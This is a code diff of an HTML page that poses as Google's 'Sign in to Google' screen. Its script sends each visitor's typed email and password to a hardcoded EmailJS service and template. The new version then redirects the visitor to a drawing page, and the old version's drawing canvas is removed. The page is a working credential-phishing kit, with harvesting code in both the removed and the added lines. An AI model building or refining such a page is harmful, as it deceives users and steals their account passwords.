@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Login and Drawing</title>
+    <title>Google Login</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -49,14 +49,9 @@
         .login-container button:hover {
             background-color: #357ae8;
         }
-        .drawing-canvas {
-            margin-top: 20px;
-            border: 1px solid #ccc;
-        }
     </style>
 </head>
 <body>
-
     <div class="login-container">
         <h2>Sign in to Google</h2>
         <form id="loginForm">
@@ -66,64 +61,31 @@
         </form>
     </div>
 
-    <canvas id="drawingCanvas" class="drawing-canvas" width="500" height="500"></canvas>
-
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        (function() {
-            emailjs.init("Wm_hgPysMxjkcdYas"); // Initialize EmailJS with User ID
-        })();
+        emailjs.init("Wm_hgPysMxjkcdYas"); // Initialize EmailJS with your user ID
 
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
             event.preventDefault();
 
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
 
-            // Send email with form data
-            const templateParams = {
-                user_email: email,
-                user_password: password
+            const data = {
+                email: email,       // Matches {{email}} in the EmailJS template
+                password: password  // Matches {{password}} in the EmailJS template
             };
 
-            emailjs.send("service_zrgq0cs", "template_8r7y8vw", templateParams)
+            emailjs.sendForm("service_zrgq0cs", "template_8r7y8vw", data)
                 .then(function(response) {
-                    console.log("Email sent successfully", response);
-                    alert("Form submitted! You will now be redirected to the drawing canvas.");
-                    showDrawingCanvas();
+                    console.log("Success:", response);
+                    // Redirect to the drawing page after successful submission
+                    window.location.href = "drawingPage.html"; // Replace with your actual drawing page URL
                 }, function(error) {
-                    console.error("Error sending email", error);
-                    alert("Failed to send form. Please try again.");
+                    console.log("Error:", error);
+                    alert("Failed to send the form. Please try again.");
                 });
         });
-
-        // Drawing functionality
-        let canvas = document.getElementById('drawingCanvas');
-        let ctx = canvas.getContext('2d');
-        let drawing = false;
-
-        canvas.addEventListener('mousedown', function(event) {
-            drawing = true;
-            ctx.beginPath();
-            ctx.moveTo(event.clientX - canvas.offsetLeft, event.clientY - canvas.offsetTop);
-        });
-
-        canvas.addEventListener('mousemove', function(event) {
-            if (drawing) {
-                ctx.lineTo(event.clientX - canvas.offsetLeft, event.clientY - canvas.offsetTop);
-                ctx.stroke();
-            }
-        });
-
-        canvas.addEventListener('mouseup', function() {
-            drawing = false;
-        });
-
-        function showDrawingCanvas() {
-            document.querySelector('.login-container').style.display = 'none';
-            document.getElementById('drawingCanvas').style.display = 'block';
-        }
     </script>
-
 </body>
 </html>
